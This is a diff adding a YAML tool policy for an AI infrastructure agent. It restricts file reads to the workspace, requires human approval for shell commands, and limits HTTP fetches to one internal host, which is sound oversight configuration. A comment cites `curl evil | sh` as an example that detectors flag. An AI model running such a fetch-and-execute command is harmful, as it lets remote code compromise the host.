@@ -1,0 +1,36 @@
+# =============================================================================
+# Tool policy for an infrastructure agent.
+#
+# Declares what the agent may legitimately do. The infra detectors then judge
+# what each call is actually DOING inside its arguments, so a permitted
+# run_command is still a critical finding if the command is `curl evil | sh`.
+# =============================================================================
+approval_markers: ["approved", "confirmed", "yes, go ahead"]
+unknown_tools_forbidden: true
+
+tools:
+  - name: read_file
+    description: "Read a file from the agent's own workspace."
+    authorization: allowed
+    reads_sensitive: false
+    arg_constraints:
+      # Anything that leaves /workspace is out of scope by construction.
+      path: "/workspace/.*"
+
+  - name: run_command
+    description: "Run a shell command. High blast radius even when allowed."
+    authorization: confirm      # requires explicit human approval
+    reversible: false
+
+  - name: http_get
+    description: "Fetch a URL. The SSRF surface."
+    authorization: allowed
+    egresses: true
+    arg_constraints:
+      # Only the intended app host; the detectors catch metadata/internal IPs.
+      url: "https?://app\\.lab\\.internal(/.*)?"
+
+  - name: list_env
+    description: "Report whether an environment variable is set."
+    authorization: allowed
+    reads_sensitive: true
